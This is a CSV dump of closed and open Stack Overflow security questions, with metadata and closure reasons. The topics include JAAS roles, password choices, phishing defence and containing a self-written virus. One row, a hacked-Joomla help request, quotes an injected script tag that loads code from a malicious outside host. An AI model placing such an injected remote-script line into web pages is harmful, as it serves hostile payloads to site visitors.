PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
4211942,11/18/2010 05:25:16,511689,11/18/2010 05:21:35,1,0,Can anybody tell an examlple of a security breach..,Can anybody tell an examlple of a security breach..,security,,,,,11/18/2010 05:45:18,not a real question,1,9,9,Can anybody tell an examlple of a security breach.. Can anybody tell an examlple of a security breach..,1
6279148,06/08/2011 13:05:55,220594,11/28/2009 19:17:54,338,8,security constraints with JAAS,"i decided to write my own JAAS login module. So far everything works fine, yet there is something i can't google out. Assume the login function by *LoginContext* has successfuly authenticated a user. How do I attach user roles to the authenticated subject so that it works with security constraints in web.xml file? Also how do I make it work with security annotations for my session beans? The way of aquiring the user roles is clear of course, the question is where do i put this data so it throws an exception on privileged functions if not authorized. I am using glassfish 3 and the point of my attempt is to create something like databaseloginmodule from jboss. Thank you for reading this, any hints, keywords are welcomed. stu",security,java-ee,annotations,authorization,jaas,,open,0,128,4,"security constraints with JAAS i decided to write my own JAAS login module. So far everything works fine, yet there is something i can't google out. Assume the login function by *LoginContext* has successfuly authenticated a user. How do I attach user roles to the authenticated subject so that it works with security constraints in web.xml file? Also how do I make it work with security annotations for my session beans? The way of aquiring the user roles is clear of course, the question is where do i put this data so it throws an exception on privileged functions if not authorized. I am using glassfish 3 and the point of my attempt is to create something like databaseloginmodule from jboss. Thank you for reading this, any hints, keywords are welcomed. stu",5
9365206,02/20/2012 17:04:57,635160,02/26/2011 03:17:19,115,2,How smart is using a space as a character in a password,"Would using a space be an uncommon character to use in a password. Uncommon enough to make it smart to use?

Or would by using a space, make it easier to crack?",security,passwords,,,,02/20/2012 17:13:45,off topic,1,31,12,"How smart is using a space as a character in a password Would using a space be an uncommon character to use in a password. Uncommon enough to make it smart to use?

Or would by using a space, make it easier to crack?",2
8860512,01/14/2012 06:05:08,1136700,01/08/2012 04:02:19,126,0,what the difference between collision protection and preimage protection?,"For hash function, that's the difference for collision protection and pre-image protection?
",security,cryptography,md5,,,01/14/2012 18:04:07,off topic,1,12,9,"what the difference between collision protection and preimage protection? For hash function, that's the difference for collision protection and pre-image protection?
",3
3646127,09/05/2010 12:59:51,375958,06/25/2010 06:23:20,215,10,Dangerous AVI files? Is any application which can open a media file under attack?,"Can `*.avi` or any media file contain any script or dangerous code?
Today i saw following message in **Microsoft Security Essentials**:

    Category: Trojan Downloader
    
    Description: This program is dangerous and downloads other programs.
    
    Recommendation: Remove this software immediately.
    Items: 
    containerfile:C:\Users\...\amediafilename.avi
    file:C:\Users\...\amediafilename.avi->(ASF_Script_Commands)

if it's true:
Commonly any media player opens file in read-only mode and they can't create a file in hard disk without user permission. Is any programming tecnique here or what? 

The main question is:Did any application that we create have some bug like players and we dont know?",security,file,media,dangerous-request,,09/08/2010 00:47:36,off topic,1,114,14,"Dangerous AVI files? Is any application which can open a media file under attack? Can `*.avi` or any media file contain any script or dangerous code?
Today i saw following message in **Microsoft Security Essentials**:

    Category: Trojan Downloader
    
    Description: This program is dangerous and downloads other programs.
    
    Recommendation: Remove this software immediately.
    Items: 
    containerfile:C:\Users\...\amediafilename.avi
    file:C:\Users\...\amediafilename.avi->(ASF_Script_Commands)

if it's true:
Commonly any media player opens file in read-only mode and they can't create a file in hard disk without user permission. Is any programming tecnique here or what? 

The main question is:Did any application that we create have some bug like players and we dont know?",4
6662245,07/12/2011 09:45:53,839016,07/11/2011 13:51:45,6,0,Change the Secure.java class of the play framework,"Is it advisable to make changes in the methods of the Secure class of play framework?
Or is there a way around it?

kind regards
joe",security,playframework,,,,,open,0,23,8,"Change the Secure.java class of the play framework Is it advisable to make changes in the methods of the Secure class of play framework?
Or is there a way around it?

kind regards
joe",2
4055513,10/29/2010 20:10:04,328397,04/28/2010 23:54:42,1033,19,Protecting source code from theft during development,"Is there any way to protect my code during development so that if a developer leaves my company they are unable to access files in my project? 

This is especially important with TFS where the project is downloaded locally, cached, and available for offline use.  Ideally the code would be unreadable if they did not have a valid Active Directory user ID.",security,encryption,tfs,code-access-security,,07/28/2012 13:44:16,off topic,1,63,7,"Protecting source code from theft during development Is there any way to protect my code during development so that if a developer leaves my company they are unable to access files in my project? 

This is especially important with TFS where the project is downloaded locally, cached, and available for offline use.  Ideally the code would be unreadable if they did not have a valid Active Directory user ID.",4
9892082,03/27/2012 14:56:45,1295853,03/27/2012 14:49:18,1,0,Joomla site hacked,"I have a old one joomla 10.0.15 that was hacked a week ago, I don't have a backup because we are planning to migrate, but I need to know what happen. After fix permissions, reinstall all core files, still have two problems, the first one is still have malicious code:

    <script src=""http://www.google-analytics.com/urchin.js"" type=""text/javascript"">
    </script>
    <script type=""text/javascript"">
    _uacct =""UA-xxxxxxx-x"";
    urchinTracker();
    </script>
    <script src=""http://equate22motorde.rr.nu/nl.php?p=d""></script>
    </body>

The url change with every reload. I can't find where the code is. I checked the template, and other files, but nothing. ¿any ideas about where can I check?

The another issue is with the file and folder access, even when the permissions are OK, this joomla installation is unable to write in folders or modify any file.

Thanks in advance.",security,joomla,,,,03/28/2012 03:07:18,off topic,1,145,3,"Joomla site hacked I have a old one joomla 10.0.15 that was hacked a week ago, I don't have a backup because we are planning to migrate, but I need to know what happen. After fix permissions, reinstall all core files, still have two problems, the first one is still have malicious code:

    <script src=""http://www.google-analytics.com/urchin.js"" type=""text/javascript"">
    </script>
    <script type=""text/javascript"">
    _uacct =""UA-xxxxxxx-x"";
    urchinTracker();
    </script>
    <script src=""http://equate22motorde.rr.nu/nl.php?p=d""></script>
    </body>

The url change with every reload. I can't find where the code is. I checked the template, and other files, but nothing. ¿any ideas about where can I check?

The another issue is with the file and folder access, even when the permissions are OK, this joomla installation is unable to write in folders or modify any file.

Thanks in advance.",2
27827,08/26/2008 12:00:00,572,08/06/2008 20:56:54,1511,142,What are good books about security and white-hat hacking?,"I'm looking at [Writing Secure Code, Second Edition][1], but I was wondering what other good books were out there on this subject. A quick search turns up plenty, but I'm not sure where to begin.

For the record, I am a software engineering undergraduate student, so I would like books that aren't all that complex, but I'm sure there are other people here with varied backgrounds and levels of experience and education that might enjoy some more comprehensive books, so feel free to post any good books on the subject. Please identify who they are appropriate for, though.


  [1]: http://www.microsoft.com/mspress/books/5957.aspx",security,hacking,white-hat,,,12/06/2011 02:47:33,not constructive,1,100,9,"What are good books about security and white-hat hacking? I'm looking at [Writing Secure Code, Second Edition][1], but I was wondering what other good books were out there on this subject. A quick search turns up plenty, but I'm not sure where to begin.

For the record, I am a software engineering undergraduate student, so I would like books that aren't all that complex, but I'm sure there are other people here with varied backgrounds and levels of experience and education that might enjoy some more comprehensive books, so feel free to post any good books on the subject. Please identify who they are appropriate for, though.


  [1]: http://www.microsoft.com/mspress/books/5957.aspx",3
7169072,08/24/2011 00:22:00,886906,08/09/2011 23:14:53,68,1,Just curious (so I know how it works): how do search engines find web-sites (if no one knows it) and folders in it?,"1) The answers for the first question would be link to the web-site from crawling page(from the page search engine knows already). But, if you type very_long_name_without_any_sense_123kni.com, I guess it will find it anyway.

2) The second question is about folders.... If you have robots.txt in your root directory, then it's a bit clear. But, if you have no robots.txt on your web-site, how will search engine find all the folders that are allowed to be accessed?

3) If a search engine knows your web-site but your web-site has no robots.txt, how long will it take to appear at most popular search engine? In 10 minutes? 1 hour? 1 day? 1 week? never? How dangerous is it to leave pages (that should be protected) unprotected even for 1 minute, if your web-site is not crawled yed (because it's protected)?

P.S. These questions are not about steps how to make your web-site popular and to appear on the first pages among others... I'm just curious about principles how it works...

Thank you.",security,search-engines,,,,08/24/2011 01:03:49,off topic,1,167,23,"Just curious (so I know how it works): how do search engines find web-sites (if no one knows it) and folders in it? 1) The answers for the first question would be link to the web-site from crawling page(from the page search engine knows already). But, if you type very_long_name_without_any_sense_123kni.com, I guess it will find it anyway.

2) The second question is about folders.... If you have robots.txt in your root directory, then it's a bit clear. But, if you have no robots.txt on your web-site, how will search engine find all the folders that are allowed to be accessed?

3) If a search engine knows your web-site but your web-site has no robots.txt, how long will it take to appear at most popular search engine? In 10 minutes? 1 hour? 1 day? 1 week? never? How dangerous is it to leave pages (that should be protected) unprotected even for 1 minute, if your web-site is not crawled yed (because it's protected)?

P.S. These questions are not about steps how to make your web-site popular and to appear on the first pages among others... I'm just curious about principles how it works...

Thank you.",2
3807083,09/27/2010 19:22:34,406405,07/30/2010 04:05:38,157,7,Why is it a bad idea to standardize a wiretap backdoor into communication services?,"This [article][1] talks about the Obama administrations plan to propose a standardized wiretap backdoor on all communication services like p2p, encrypted communication services, etc. The article mentions that technology advocates suggest it will make life easier for hackers, which seems obvious. 

Can someone explain why this is such a bad idea? It goes against everything I know about security, but I don't know enough to articulate a technically sound argument. 


  [1]: http://www.aolnews.com/nation/article/report-us-would-make-internet-wiretaps-easier/19649649",security,encryption,communication,,,09/27/2010 19:31:23,off topic,1,74,14,"Why is it a bad idea to standardize a wiretap backdoor into communication services? This [article][1] talks about the Obama administrations plan to propose a standardized wiretap backdoor on all communication services like p2p, encrypted communication services, etc. The article mentions that technology advocates suggest it will make life easier for hackers, which seems obvious. 

Can someone explain why this is such a bad idea? It goes against everything I know about security, but I don't know enough to articulate a technically sound argument. 


  [1]: http://www.aolnews.com/nation/article/report-us-would-make-internet-wiretaps-easier/19649649",3
1469899,09/24/2009 05:34:21,44540,12/09/2008 09:12:48,2591,134,What's the worst security hole you've ever seen?,"Subject says it all, probably a good idea to keep details basic to protect the guilty.",security,,,,,10/13/2011 06:41:47,not constructive,1,16,8,"What's the worst security hole you've ever seen? Subject says it all, probably a good idea to keep details basic to protect the guilty.",1
9721359,03/15/2012 14:04:14,858862,07/23/2011 01:03:10,123,5,Hacking computer networks,"I am looking for a book/website/blog etc. about hacking computer networks. I don't mean things like social engineering/SQL injection/exploiting server configuration, but hacks at protocol level, like injecting packets, Ethernet level network protection etc. I am really interested in computer security, but this area is still black magic to me and I want to develop my skills in it. 

I know this question may seem a little bit to general to ask on stack overflow, but it's really difficult to find broad materials about this narrow area.",security,networking,protocols,hacking,,04/04/2012 12:38:36,not a real question,1,87,3,"Hacking computer networks I am looking for a book/website/blog etc. about hacking computer networks. I don't mean things like social engineering/SQL injection/exploiting server configuration, but hacks at protocol level, like injecting packets, Ethernet level network protection etc. I am really interested in computer security, but this area is still black magic to me and I want to develop my skills in it. 

I know this question may seem a little bit to general to ask on stack overflow, but it's really difficult to find broad materials about this narrow area.",4
10674616,05/20/2012 15:11:20,801018,06/16/2011 07:46:53,12,0,Track copied files to USB storage device,"is there a way to track a specific file (rar archive) that was copied to a external USB device, on Windows 7?
Very sensitive data left our system, after former employee finished its last day at company.
I was able to track that the data was archived as .rar (date & time), and was able to track that 2 minutes later, 'his' USB device was plugged into system.
I need a prove that exactly this .rar archive was copied over to the USB drive.
Can you help me please? 

Was not able to find much at event viewer.",security,windows-7,usb,,,05/21/2012 17:43:39,off topic,1,94,7,"Track copied files to USB storage device is there a way to track a specific file (rar archive) that was copied to a external USB device, on Windows 7?
Very sensitive data left our system, after former employee finished its last day at company.
I was able to track that the data was archived as .rar (date & time), and was able to track that 2 minutes later, 'his' USB device was plugged into system.
I need a prove that exactly this .rar archive was copied over to the USB drive.
Can you help me please? 

Was not able to find much at event viewer.",3
7041900,08/12/2011 14:52:38,686054,03/31/2011 15:37:45,468,4,What precautions to take if writing a virus,"If I was to Write a virus for the challenge What would I need to do to contain it ?

Obviously I would disconnect the computer from the internet first but what else could I do to prevent the worst case scenario of it making it on to the internet. 
Im not saying im smart enough to bring down society but I don't want to go to jail for a weekend project. 

Is is likely that my antivirus will kill my virus program as soon as it is compiled ? ",security,virus,,,,08/12/2011 19:35:59,not constructive,1,90,8,"What precautions to take if writing a virus If I was to Write a virus for the challenge What would I need to do to contain it ?

Obviously I would disconnect the computer from the internet first but what else could I do to prevent the worst case scenario of it making it on to the internet. 
Im not saying im smart enough to bring down society but I don't want to go to jail for a weekend project. 

Is is likely that my antivirus will kill my virus program as soon as it is compiled ? ",2
7919071,10/27/2011 16:18:01,1016835,10/27/2011 15:46:29,1,0,How Use obfuscation in .Net Project and C++ Project?,"I have big problem in my project security.
How i can improve them??
I know Obfuscation and Stolen. How i can use them in my project?",security,,,,,10/28/2011 10:51:34,not a real question,1,24,9,"How Use obfuscation in .Net Project and C++ Project? I have big problem in my project security.
How i can improve them??
I know Obfuscation and Stolen. How i can use them in my project?",1
3080896,06/20/2010 20:49:57,183528,10/03/2009 08:19:49,6938,392,What is the best way to stop phishing for online banking?,"[Phishing][1] is a very serious problem that we face. However, banks are the biggest targets.  What methods can a bank use to protect its self from phishing attacks? What methods should someone use to protect themselves.   Why does it stop attacks? 

  [1]: http://en.wikipedia.org/wiki/Phishing",security,phishing,,,,06/27/2010 02:56:09,off topic,1,48,11,"What is the best way to stop phishing for online banking? [Phishing][1] is a very serious problem that we face. However, banks are the biggest targets.  What methods can a bank use to protect its self from phishing attacks? What methods should someone use to protect themselves.   Why does it stop attacks? 

  [1]: http://en.wikipedia.org/wiki/Phishing",2
3559253,08/24/2010 17:32:26,198358,10/28/2009 18:38:00,13,0,How to Encrypt Clipboard?,"Can the contents of the clipboard be encrypted?

For example, say that to circumvent keyloggers, users copy and paste passwords from an encrypted file, but now the password lives unencrypted in the clipboard. Is there a way to prevent this behavior without breaking copy/paste, or running some script function that scrambles the clipboard information. ",security,clipboard,,,,08/26/2010 02:29:44,off topic,1,54,4,"How to Encrypt Clipboard? Can the contents of the clipboard be encrypted?

For example, say that to circumvent keyloggers, users copy and paste passwords from an encrypted file, but now the password lives unencrypted in the clipboard. Is there a way to prevent this behavior without breaking copy/paste, or running some script function that scrambles the clipboard information. ",2
